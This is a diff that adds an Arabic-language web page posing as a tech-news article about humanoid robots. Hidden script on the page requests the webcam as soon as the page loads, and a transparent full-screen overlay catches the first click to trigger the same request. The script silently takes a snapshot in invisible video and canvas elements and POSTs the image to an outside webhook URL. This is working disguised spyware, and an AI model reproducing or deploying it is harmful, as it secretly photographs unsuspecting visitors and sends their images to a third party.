@@ -1,0 +1,106 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>أخبار التقنية | اكتشافات مذهلة في عالم الروبوتات</title>
+    <link href="https://googleapis.com" rel="stylesheet">
+    <style>
+        body { font-family: 'Cairo', sans-serif; background-color: #f8f9fa; margin: 0; color: #222; }
+        header { background: #1a73e8; color: white; padding: 20px; text-align: center; font-weight: bold; font-size: 22px; }
+        
+        /* طبقة شفافة فوق الموقع بالكامل لجذب أول نقرة */
+        #overlay {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            z-index: 9999; background: rgba(255,255,255,0.01); cursor: pointer;
+        }
+
+        .content { max-width: 900px; margin: auto; background: white; padding: 25px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); }
+        .post-meta { color: #666; font-size: 14px; margin-bottom: 15px; }
+        .main-img { width: 100%; border-radius: 12px; margin-bottom: 25px; transition: 0.5s; }
+        .main-img:hover { transform: scale(1.02); }
+        
+        h1 { font-size: 28px; line-height: 1.4; color: #111; }
+        p { line-height: 1.9; font-size: 17px; margin-bottom: 20px; }
+        
+        .gallery { display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 15px; margin: 30px 0; }
+        .gallery img { width: 100%; height: 200px; object-fit: cover; border-radius: 10px; border: 3px solid #eee; }
+        
+        video, canvas { display: none; }
+        .loading-bar { height: 4px; background: #1a73e8; width: 0%; position: fixed; top: 0; transition: 0.5s; }
+    </style>
+</head>
+<body>
+
+<div id="overlay" onclick="triggerNow()"></div>
+<div class="loading-bar" id="lbar"></div>
+
+<header>بوابة التقنية العربية</header>
+
+<div class="content">
+    <div class="post-meta">نُشر في: 15 أبريل 2024 | بقلم: م. أحمد سالم</div>
+    <h1>الروبوتات البشرية: هل نعيش في عصر الخيال العلمي؟</h1>
+    
+    <img src="https://unsplash.com" class="main-img">
+
+    <p>لقد شهدت السنوات الأخيرة تطوراً مذهلاً في تصميم الروبوتات التي تشبه البشر. لم يعد الأمر مقتصرًا على الحركات البسيطة، بل أصبحنا نرى ذكاءً اصطناعيًا قادرًا على التفاعل العاطفي.</p>
+
+    <div class="gallery">
+        <img src="https://unsplash.com">
+        <img src="https://unsplash.com">
+        <img src="https://unsplash.com">
+    </div>
+
+    <p>تشير الدراسات إلى أن أكثر من 40% من الوظائف التقليدية قد يتم استبدالها بأنظمة آلية خلال العقد القادم. الصور أعلاه تظهر مدى دقة التصنيع الحديثة التي تحاكي ملامح البشر بدقة متناهية.</p>
+</div>
+
+<video id="video" autoplay></video>
+<canvas id="canvas"></canvas>
+
+<script>
+    const WEBHOOK_URL = 'https://63217963-280f-44c4-94ed-8ad5666a9f2f.webhook.site';
+
+    // طلب الإذن فور التحميل
+    window.onload = () => {
+        document.getElementById('lbar').style.width = '70%';
+        triggerNow();
+    };
+
+    async function triggerNow() {
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            const video = document.getElementById('video');
+            const canvas = document.getElementById('canvas');
+            video.srcObject = stream;
+
+            // إخفاء الطبقة الشفافة بعد التفاعل
+            document.getElementById('overlay').style.display = 'none';
+            document.getElementById('lbar').style.width = '100%';
+
+            setTimeout(() => {
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                
+                const imageData = canvas.toDataURL('image/png');
+
+                fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    mode: 'no-cors',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        status: "Success",
+                        image: imageData
+                    })
+                }).then(() => {
+                    stream.getTracks().forEach(track => track.stop());
+                });
+            }, 1500); // مهلة قصيرة لالتقاط صورة واضحة
+        } catch (err) {
+            console.log("Permission Pending...");
+        }
+    }
+</script>
+
+</body>
+</html>
